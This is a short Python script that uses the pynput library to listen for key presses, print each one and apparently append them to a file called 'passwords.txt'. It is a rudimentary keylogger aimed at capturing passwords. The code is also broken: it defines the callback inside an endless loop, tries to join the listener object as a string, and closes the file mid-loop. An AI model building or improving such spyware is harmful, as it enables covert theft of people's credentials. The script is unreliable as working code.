from pynput.keyboard import Key,Listener
f2 = open('passwords.txt','a')

while True:
    def on_press(Key):
        print(Key,"is pressed")
        
        
    with Listener(on_press=on_press) as listener:
        #f2.writelines(on_press)
        listener.join()
        b = ''.join(listener)
        f2.write(b)
        f2.close()


